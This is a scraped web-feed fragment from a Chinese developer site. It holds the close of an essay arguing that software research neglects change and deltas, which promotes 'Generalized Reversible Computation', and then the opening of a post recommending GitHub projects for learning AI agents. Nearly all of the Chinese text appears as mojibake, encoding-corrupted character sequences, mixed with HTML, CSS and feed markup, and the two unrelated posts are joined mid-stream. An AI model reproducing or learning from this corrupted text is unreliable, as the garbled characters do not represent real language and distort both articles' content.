<li>å®šä¹‰ä¸€ä¸ª Generic çš„è§£æå™¨ï¼Œä½œä¸ºä» Excel èŒƒç•´åˆ° DSL èŒƒç•´çš„æ¨¡å‹è§£æå‡½å­ï¼›</li>
<li>å†å®šä¹‰ä¸€ä¸ªä» DSL åˆ° Excel çš„Reportå¯¼å‡ºå‡½å­ï¼Œå½¢æˆä¸€å¯¹ä¼´éšã€‚</li>
</ul>
<p>ä¸€ä¸ªå¥½çš„å¯è§†åŒ– Editor: Model â†’ Viewï¼Œæœ¬è´¨ä¸Šåº”è¯¥æ˜¯ä¸€ä¸ªä¿å·®é‡ç»“æ„çš„å‡½å­ï¼Œæ»¡è¶³ Editor(Base âŠ• Ext) â‰ˆ Editor(Base) âŠ• Editor(Ext) è¿™ç§åŒæ€æ€§è´¨ï¼Œè¿™æ · Î” åœ¨è§†å›¾å±‚ä¹Ÿèƒ½å¹²å‡€åˆ†è§£ã€å¯é€†å›åˆ°æ¨¡å‹</p>
<h2 data-id="heading-19">äº”ã€å›åˆ°åŸé—®é¢˜ï¼šçœŸæ­£ä¸¥é‡çš„ç¼ºé™·æ˜¯ä»€ä¹ˆï¼Ÿ</h2>
<p>ç°åœ¨å¯ä»¥æ¯”è¾ƒç²¾ç¡®åœ°å›ç­”ï¼šâ€œç›®å‰ PL / SE ç ”ç©¶ä¸­çœŸæ­£ä¸¥é‡çš„ç¼ºé™·æ˜¯ä»€ä¹ˆï¼Ÿâ€</p>
<h3 data-id="heading-20">5.1 ç¼ºé™·ä¸åœ¨æŸä¸ªæŠ€æœ¯åˆ†æ”¯ï¼Œè€Œåœ¨â€œä¸–ç•Œè§‚å±‚çº§é€‰é”™äº†â€</h3>
<p>å½“å‰ä½“ç³»æŠŠâ€œè½¯ä»¶ç§‘å­¦çš„ä¸»å³°â€è®¾åœ¨ï¼š</p>
<blockquote>
<p>å¦‚ä½•å®šä¹‰å’ŒéªŒè¯ä¸€ä¸ªç¨‹åº Pï¼ˆé™æ€å®‰å…¨ã€è¯­ä¹‰æ­£ç¡®ã€è¡Œä¸ºå¯é¢„æµ‹ï¼‰ã€‚</p>
</blockquote>
<p>ä½†ç°å®ä¸­æœ€éš¾ã€æœ€å…³é”®çš„é—®é¢˜ï¼Œæ˜¯ï¼š</p>
<blockquote>
<p>å¦‚ä½•ç³»ç»Ÿåœ°å®šä¹‰ã€æ“ä½œã€æ¨ç†ä¸€æ•´ä¸ªç¨‹åºæ—åŠå…¶é•¿æœŸæ¼”åŒ–ï¼Œ<br/>
å³ï¼š{Pâ‚€, Pâ‚, â€¦, Pâ‚™} ä¸ {Î”â‚, Î”â‚‚, â€¦, Î”â‚™} çš„ç»“æ„ã€‚</p>
</blockquote>
<p>è¿™ä¸ªå±‚çº§è¢«ä¸¥é‡ä½ä¼°äº†ï¼Œä¸”è¢«â€œå¤–åŒ…â€ç»™å·¥ç¨‹å®è·µã€‚</p>
<h3 data-id="heading-21">5.2 å·®é‡ï¼ˆÎ”ï¼‰ä¸å¯é€†æ€§æ²¡æœ‰è¢«å½“ä½œâ€œæ•°å­¦ä¸€ç­‰å…¬æ°‘â€</h3>
<p>æˆ‘ä»¬æœ‰ï¼š</p>
<ul>
<li>æˆç†Ÿçš„ç±»å‹è®ºå¤„ç†é™æ€å®‰å…¨ï¼›</li>
<li>ç†Ÿç»ƒçš„å½¢å¼æ–¹æ³•å¤„ç†â€œä¸€ä¸ªç‰ˆæœ¬â€çš„æ­£ç¡®æ€§ï¼›</li>
<li>é›¶æ•£çš„ delta-oriented programmingã€SPLã€BX ç­‰å„è‡ªè®²è‡ªå·±çš„ Î”ã€‚</li>
</ul>
<p>ä½†æˆ‘ä»¬æ²¡æœ‰çš„æ˜¯ï¼š</p>
<ul>
<li>ä¸€é—¨ç±»ä¼¼â€œç±»å‹è®ºä¹‹äºé™æ€å®‰å…¨â€çš„**â€œå˜åŒ–ç§‘å­¦â€**ï¼›</li>
<li>æ˜ç¡®ä»¥ Î”ã€âŠ•ã€å¯é€†æ€§ã€ç†µå¢ã€æ¼”åŒ–è½¨è¿¹ä¸ºå¯¹è±¡çš„ä¸»æµç†è®ºä¸»çº¿ã€‚</li>
</ul>
<p>å­˜åœ¨å„ç§é›¶æ•£çš„Î”ï¼Œä½†è¯­ä¹‰ä¸ç»Ÿä¸€ã€å…¬ç†ä¸æ¸…æ™°ã€å±‚æ¬¡æ··ä¹±ã€‚<br/>
å­¦ç•Œåœ¨è¿™ä¸Šé¢çš„ç³»ç»ŸåŒ–æŠ½è±¡ä¸¥é‡æ»åäºå·¥ç¨‹å®é™…éœ€æ±‚ã€‚<strong>å·®é‡ä¸åˆå¹¶æ²¡æœ‰è¢«å½“æˆâ€œæ•°å­¦å¯¹è±¡â€ï¼Œè€Œåªæ˜¯å·¥ç¨‹å·¥å…·</strong></p>
<p>GRC å¹¶ä¸æ˜¯åœ¨ç°æœ‰ç†è®ºä¹‹ä¸Šâ€œå†è¡¥ä¸€ä¸ªå·¥å…·å±‚â€ï¼Œè€Œæ˜¯è¯•å›¾æŠŠ Î”/âŠ•ã€å¯é€†æ€§ã€ç†µå¢æ§åˆ¶ï¼Œæå‡åˆ°å’Œç±»å‹è®ºåŒä¸€å±‚çº§çš„â€œåŸºç¡€ç†è®ºç»„æˆéƒ¨åˆ†</p>
<h3 data-id="heading-22">5.3 å¯¹â€œè½¯ä»¶ä¸–ç•Œâ€çš„ç†è§£ä»åœç•™åœ¨â€œç²’å­è§†è§’â€ï¼Œç¼ºå°‘â€œæ³¢åŠ¨/åœºè§†è§’â€</h3>
<p>ä»Šå¤©çš„ä¸»æµè§†è§’æ˜¯ï¼š</p>
<ul>
<li>åŸºæœ¬å•å…ƒï¼šå¯¹è±¡ã€æ¨¡å—ã€ç»„ä»¶ï¼ˆç²’å­ï¼‰ï¼›</li>
<li>å…³æ³¨çš„æ˜¯ï¼šè¿™ä¸ªå¯¹è±¡æ˜¯ä»€ä¹ˆï¼Œè¿™ä¸ªæ¨¡å—æœ‰ä»€ä¹ˆæ¥å£ã€‚</li>
</ul>
<p>å¯é€†/å·®é‡å¯¼å‘çš„è§†è§’æ›´åƒâ€œæ³¢åŠ¨/åœºâ€ï¼š</p>
<ul>
<li>åŸºæœ¬å•å…ƒï¼šç»“æ„ç©ºé—´ + åœºä¸Šçš„æ‰°åŠ¨ï¼ˆÎ”ï¼‰ï¼›</li>
<li>å…³æ³¨çš„æ˜¯ï¼šåœ¨ä»€ä¹ˆåæ ‡ç³»ä¸‹å‘ç”Ÿäº†ä»€ä¹ˆå˜åŒ–ï¼Œè¿™äº›å˜åŒ–å¦‚ä½•å åŠ ã€ç›¸æ¶ˆã€‚</li>
</ul>
<p>è¿™ä¸¤ç§è§†è§’ä¸æ˜¯éæ­¤å³å½¼ï¼Œä½†ç›®å‰å­¦ç•Œå‡ ä¹å…¨åœ¨â€œç²’å­ä¾§â€ï¼Œ<br/>
â€œæ³¢åŠ¨/åœºâ€ä¾§è¿˜è¿œè¿œæ²¡æœ‰è¢«ç³»ç»Ÿå‘å±•ã€‚</p>
<h3 data-id="heading-23">5.4 å¤šæ¨¡å‹ã€å¤š DSLã€å¤šè¡¨è±¡ååŒç¼ºä¹ç»Ÿä¸€ç©ºé—´è§‚</h3>
<p>ç°å®ä¸­çš„å¤§å‹ç³»ç»Ÿæ¼”åŒ–ï¼Œè¶Šæ¥è¶Šæ˜¯â€œå¤šæ¨¡å‹ã€å¤šè§†å›¾ã€å¤š DSL çš„ååŒæ¼”åŒ–â€ã€‚<br/>
è€Œè¿™ä¸€å—ï¼Œç›®å‰ä¸»è¦ä¾é ï¼š</p>
<ul>
<li>å·¥å…·é“¾å„è‡ªåšä¸€ç‚¹è½¬æ¢ï¼›</li>
<li>å·¥ç¨‹å¸ˆåœ¨å„å±‚ä¹‹é—´äººè‚‰åŒæ­¥ï¼›</li>
<li>ç‰ˆæœ¬ä¹…äº†å°±å¤±å»ä¸€è‡´æ€§ã€‚</li>
</ul>
<p>ç¼ºä¹ä¸€ä¸ªç»Ÿä¸€çš„â€œæ¨¡å‹ç©ºé—´ + å·®é‡ä¼ æ’­â€ç†è®ºæ¥ç»Ÿæ‘„ã€‚</p>
<h2 data-id="heading-24">å…­ã€æœ€åï¼šè¿™ç¯‡å›ç­”æƒ³è¡¨è¾¾çš„ç«‹åœº</h2>
<ul>
<li>
<p>å¹¶ä¸æ˜¯è¯´â€œç±»å‹è®ºã€èŒƒç•´è®ºã€å½¢å¼æ–¹æ³•éƒ½ä¸é‡è¦â€ï¼Œè€Œæ˜¯ï¼š<br/>
å®ƒä»¬è§£å†³çš„æ˜¯â€œé™æ€æ­£ç¡®æ€§ + å±€éƒ¨è®¡ç®—â€çš„é—®é¢˜ï¼Œè€Œä¸”åœ¨â€œå˜æ¢æœ¬ä½â€çš„ä¸–ç•Œè§‚ä¸‹è¢«ç”¨å¾—è¿‡äºç‹­çª„ã€‚</p>
</li>
<li>
<p>çœŸæ­£è¢«ä½ä¼°ã€ä¹Ÿè¢«ç†è®ºç•Œâ€œå¤–åŒ…ç»™å·¥ç¨‹ç»éªŒâ€çš„ï¼Œæ˜¯ï¼š</p>
<ul>
<li>ç”Ÿæˆ + æ¼”åŒ–ç»Ÿä¸€å»ºæ¨¡ï¼ˆY = F(X) âŠ• Î”ï¼‰ï¼›</li>
<li>å·®é‡ä»£æ•°ï¼ˆÎ” çš„ç»“æ„ä¸ âŠ• çš„å…¬ç†ï¼‰ï¼›</li>
<li>å¤šè¡¨è±¡ã€å¤šæ¨¡å‹ä¹‹é—´çš„å¯é€†å˜æ¢ä¸å·®é‡ä¼ æ’­ï¼›</li>
<li>ç¨‹åºç»“æ„ç©ºé—´çš„â€œå‡ ä½•ä¸åœºâ€è§†è§’ï¼ˆåæ ‡ã€å±€éƒ¨æ‰°åŠ¨ã€è·¯å¾„ç§¯ç´¯ï¼‰ï¼›</li>
<li>ç”¨å¯é€†æ€§å’Œç†µçš„è§†è§’æ¥ç†è§£å’Œæ§åˆ¶è½¯ä»¶æ¼”åŒ–ã€‚</li>
</ul>
</li>
<li>
<p>è¿™äº›éƒ¨åˆ†ï¼Œç›®å‰æ›´å¤šæ˜¯ç”±ï¼š</p>
<ul>
<li>Gitã€è¿ç§»è„šæœ¬ã€é…ç½®ç³»ç»Ÿã€è„šæ‰‹æ¶ã€å†…åµŒ DSLï¼›</li>
<li>æ¶æ„ç»éªŒå’Œå›¢é˜Ÿçº¦å®šï¼›
åœ¨æ”¯æ’‘ï¼Œå´æ²¡æœ‰ä¸€å¥—åƒç±»å‹/é€»è¾‘é‚£æ ·ç»Ÿä¸€ã€å¯ç»„åˆçš„ç†è®ºåŸºç¡€ã€‚</li>
</ul>
</li>
</ul>
<p>æ‰€ä»¥ï¼Œå¦‚æœè¦å›ç­”â€œç°æœ‰ç ”ç©¶æœ‰å“ªäº›ä¸¥é‡ç¼ºé™·â€ï¼Œå¯ä»¥è¯´ï¼š</p>
<blockquote>
<p>â€œä¸¥é‡â€å¹¶ä¸åœ¨äºæŸä¸ªæŠ€æœ¯åˆ†æ”¯åšé”™äº†ï¼Œè€Œåœ¨äºæ•´ä¸ªå­¦ç•Œçš„è§†è§’åœ¨å±‚çº§ä¸Šé”™ä½â€”â€”<br/>
æŠŠâ€œå•ä¸ªç¨‹åºçš„é™æ€å®‰å…¨â€å½“æˆäº†è½¯ä»¶ç§‘å­¦çš„ä¸»å³°ï¼Œè€ŒæŠŠâ€œå˜åŒ–æœ¬èº«â€æ”¾åœ¨ç†è®ºè§†é‡ä¹‹å¤–ã€‚</p>
<p>è€Œå¹¿ä¹‰å¯é€†è®¡ç®—ï¼ˆGRCï¼‰ç»™å‡ºäº†ä¸€ä¸ªå€™é€‰ç­”æ¡ˆï¼š<br/>
æŠŠè½¯ä»¶ç†è§£ä¸ºåœ¨ç»“æ„ç©ºé—´ä¸Šå åŠ å·®é‡åœºï¼Œ<br/>
ç”¨ <code>Y = F(X) âŠ• Î”</code> è¿™æ¡æ–¹ç¨‹ï¼ŒæŠŠæ„é€ ä¸æ¼”åŒ–ç»Ÿä¸€èµ·æ¥ï¼ŒæŠŠå¯é€†æ€§ä¸ç†µå¢æ§åˆ¶çº³å…¥è½¯ä»¶ç†è®ºçš„åŸºæœ¬ç›®æ ‡ï¼Œ
è®©å·®é‡ï¼ˆÎ”ï¼‰å’Œåˆå¹¶ï¼ˆâŠ•ï¼‰ä»å·¥ç¨‹è‹¦å·¥ï¼Œå›åˆ°å¯å…¬ç†åŒ–ã€å¯ç»„åˆã€å¯æ¨ç†çš„æ•°å­¦å¯¹è±¡ã€‚</p>
</blockquote>
<p>å‚è€ƒï¼š</p>
<ul>
<li>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2Fxao9AKlOST0d97ztuU3z9Q" target="_blank" title="https://mp.weixin.qq.com/s/xao9AKlOST0d97ztuU3z9Q" ref="nofollow noopener noreferrer">DDDæœ¬è´¨è®º:ä»å“²å­¦åˆ°æ•°å­¦ï¼Œå†åˆ°å·¥ç¨‹å®è·µçš„å®Œæ•´æŒ‡å—ä¹‹ç†è®ºç¯‡</a>: ç»“åˆï¼ˆå¹¿ä¹‰ï¼‰å¯é€†è®¡ç®—ç†è®ºï¼Œä»å“²å­¦ã€æ•°å­¦åˆ°å·¥ç¨‹å±‚é¢ï¼Œç³»ç»Ÿæ€§åœ°å‰–æäº†DDDï¼ˆé¢†åŸŸé©±åŠ¨è®¾è®¡ï¼‰çš„æŠ€æœ¯å†…æ ¸ï¼Œè®¤ä¸ºå…¶æœ‰æ•ˆæ€§èƒŒåå­˜åœ¨ç€æ•°å­¦å¿…ç„¶æ€§ã€‚</p>
</li>
<li>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2FpNXPEvyVB7ljOhBQVh6c-A" target="_blank" title="https://mp.weixin.qq.com/s/pNXPEvyVB7ljOhBQVh6c-A" ref="nofollow noopener noreferrer">å¹¿ä¹‰å¯é€†è®¡ç®—: ä¸€ä¸ªè½¯ä»¶æ„é€ èŒƒå¼çš„æ­£åä¸é˜é‡Š</a>:ä¸ºâ€œå¹¿ä¹‰å¯é€†è®¡ç®—â€ï¼ˆGRCï¼‰æ­£åï¼Œé˜é‡Šäº†å…¶æ ¸å¿ƒæ€æƒ³â€”â€”ä»¥â€œå·®é‡â€ï¼ˆDeltaï¼‰ä¸ºç¬¬ä¸€ç±»å…¬æ°‘ï¼Œç³»ç»Ÿæ€§åœ°ç®¡ç†è½¯ä»¶æ„é€ è¿‡ç¨‹ä¸­çš„å¯é€†æ€§ä¸ä¸å¯é€†æ€§ï¼Œæ—¨åœ¨è§£å†³â€œå¤æ‚æ€§â€è¿™ä¸€æ ¸å¿ƒå·¥ç¨‹éš¾é¢˜ã€‚</p>
</li>
<li>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2FZu80p-8HtfXi7O-IPK5Wxw" target="_blank" title="https://mp.weixin.qq.com/s/Zu80p-8HtfXi7O-IPK5Wxw" ref="nofollow noopener noreferrer">(å¹¿ä¹‰)å¯é€†è®¡ç®—ç†è®ºé€Ÿè§ˆ-ç»Ÿä¸€è½¯ä»¶æ„é€ ä¸æ¼”åŒ–çš„æ–°èŒƒå¼</a>: æä¾›äº†ï¼ˆå¹¿ä¹‰ï¼‰å¯é€†è®¡ç®—ç†è®ºçš„å¿«é€Ÿæ¦‚è§ˆï¼Œæ€»ç»“äº†å…¶æ ¸å¿ƒå…¬å¼ <code>App = Delta x-extends Generator&lt;DSL&gt;</code>ã€å¯¹ä¼ ç»Ÿç†è®ºï¼ˆå¦‚æ¨¡å‹é©±åŠ¨æ¶æ„ï¼‰çš„ç»§æ‰¿ä¸å‘å±•ï¼Œä»¥åŠå…³é”®æŠ€æœ¯å®ç°ã€‚</p>
</li>
<li>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2FiZWcRa_Af8Io6AAUXd-0Vg" target="_blank" title="https://mp.weixin.qq.com/s/iZWcRa_Af8Io6AAUXd-0Vg" ref="nofollow noopener noreferrer">è®©æ¼”åŒ–å¯ç¼–ç¨‹ï¼šXLang ä¸å¯é€†è®¡ç®—çš„ç»“æ„åŒ–èŒƒå¼</a></p>
</li>
<li>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2FhbNiy3E7-JH8_SXpN2EOXg" target="_blank" title="https://mp.weixin.qq.com/s/hbNiy3E7-JH8_SXpN2EOXg" ref="nofollow noopener noreferrer">æ¨¡å‹é©±åŠ¨æ¶æ„çš„æ•°å­¦å†…æ ¸ï¼šç»Ÿä¸€ç”Ÿæˆä¸æ¼”åŒ–çš„ Y = F(X) âŠ• Delta ä¸å˜å¼</a></p>
</li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[å»ºè®®å» GitHub å­¦è¿™ 6 ä¸ªé¡¹ç›®ï¼Œæ‰“ç ´ Agent çš„ä¿¡æ¯å·®ã€‚]]></title>    <link>https://juejin.cn/post/7581769891498508307</link>    <guid>https://juejin.cn/post/7581769891498508307</guid>    <pubDate>2025-12-10T02:46:15.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7581769891498508307" data-draft-id="7581689310644502570" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="å»ºè®®å» GitHub å­¦è¿™ 6 ä¸ªé¡¹ç›®ï¼Œæ‰“ç ´ Agent çš„ä¿¡æ¯å·®ã€‚"/> <meta itemprop="keywords" content="GitHub"/> <meta itemprop="datePublished" content="2025-12-10T02:46:15.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="é€›é€›GitHub"/> <meta itemprop="url" content="https://juejin.cn/user/1442202996186093"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            å»ºè®®å» GitHub å­¦è¿™ 6 ä¸ªé¡¹ç›®ï¼Œæ‰“ç ´ Agent çš„ä¿¡æ¯å·®ã€‚
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1442202996186093/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    é€›é€›GitHub
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-10T02:46:15.000Z" title="Wed Dec 10 2025 02:46:15 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-10
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»5åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body cache result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>2025å¹´ï¼Œæ¯«æ— ç–‘é—®å°†æ˜¯ Agentï¼ˆæ™ºèƒ½ä½“ï¼‰å…ƒå¹´ï¼ŒGitHub ä¸Šæ— ç–‘æ˜¯éå¸¸é‡è¦çš„ä¸€ä¸ªå­¦ä¹ å¹³å°ï¼Œä¸Šé¢æœ‰å¾ˆå¤šå®è—æ•™ç¨‹ã€‚ä»Šå¤©æ¨èå‡ ä¸ª Agent å­¦ä¹ å¼€æºé¡¹ï¼Œï¼Œæ„Ÿå…´è¶£çš„å¯ä»¥å…ˆæ”¶è—æœ¬æ–‡ï¼Œæ–¹ä¾¿åé¢å›é¡¾ã€‚</p>
<h2 data-id="heading-0">01ã€Hello-Agents</h2>
<p>å›½å†…ç¤¾åŒº Datawhale å¼€æºçš„æ•™ç¨‹ï¼ŒGitHub ä¸Šæœ‰ 5700+ Starã€‚</p>
<p>è¿™ä¸ªæ•™ç¨‹æ—¢èƒ½å¸¦ä½ æ·±å…¥åº•å±‚åŸç†ï¼Œåˆèƒ½æ‰‹æŠŠæ‰‹å¸¦ä½ å†™å‡ºèƒ½è·‘çš„ Agent ä»£ç ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/487c29c55b984dae8773370c97298000~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6YCb6YCbR2l0SHVi:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765939575&amp;x-signature=cmN339PLXZrz9D8ZH8FSjqEUcLQ%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p>å®ƒä¸ä»…ä»…æ˜¯ä¸€ä¸ªä»£ç ä»“åº“ï¼Œæ›´åƒæ˜¯ä¸€æœ¬<strong>äº’åŠ¨å¼çš„æ•™ç§‘ä¹¦</strong>ã€‚å¸®ä½ ä»ä¸€åå¤§æ¨¡å‹çš„ä½¿ç”¨è€…ï¼Œèœ•å˜ä¸ºä¸€åæ™ºèƒ½ä½“ç³»ç»Ÿçš„æ„å»ºè€…ã€‚</p>
<p>è¿™ä¸ªå¼€æºé¡¹ç›®å†…å®¹å¾ˆä¸°å¯Œï¼Œä¸åƒå¾ˆå¤šæ•™ç¨‹ä¸Šæ¥å°±è®©ä½ è°ƒ LangChain çš„æ¥å£ã€‚</p>
<p>Hello-Agents éå¸¸ç¡¬æ ¸ï¼Œå®ƒä¼šå¸¦ä½ æ‰‹æ“æ¡†æ¶ï¼šä¸ä¾èµ–ç°æˆåº“ï¼Œç”¨åŸç”ŸOpenAI API ä»é›¶æ„å»ºä¸€ä¸ª Agent æ¡†æ¶ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e306cbb9c6c44fddb7f563ee2db16952~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6YCb6YCbR2l0SHVi:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765939575&amp;x-signature=nWRdKKhwAYKrO7%2F7HFGoQR0B4lI%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p>å½»åº•ç†è§£ ReActï¼ˆæ¨ç†+è¡ŒåŠ¨ï¼‰ã€Plan-and-Solveã€Reflectionï¼ˆåæ€ï¼‰è¿™äº›ç»å…¸èŒƒå¼æ˜¯å¦‚ä½•åœ¨ä»£ç å±‚é¢å®ç°çš„ã€‚</p>
<p>åªæœ‰å½“ä½ äº²æ‰‹é€ è¿‡è½®å­ï¼Œä½ æ‰èƒ½çœŸæ­£ç†è§£è½®å­æ˜¯æ€ä¹ˆè½¬çš„ã€‚</p>
<p>å¦å¤–è¿™ä¸ªå¼€æºé¡¹ç›®è¿˜æ•™ä½ ä½¿ç”¨ Cozeã€Difyã€n8n ç­‰å¹³å°å¿«é€Ÿæ­å»ºåº”ç”¨ï¼Œé€‚åˆå¿«é€ŸéªŒè¯æƒ³æ³•ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/230369ab362d4d0d9d4f1148a74928ef~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6YCb6YCbR2l0SHVi:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765939575&amp;x-signature=9x7cR9SOrwm%2FMI21myKzs55HKEA%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p>é™¤æ­¤ä¹‹å¤–ï¼ŒHello-AgentsÂ è¿˜èƒ½æ·±å…¥ LangGraph ç­‰ä¸»æµæ¡†æ¶ï¼Œè®²è§£å¦‚ä½•ç”¨ä»£ç æ§åˆ¶å¤æ‚çš„ Agent å·¥ä½œæµã€‚</p>
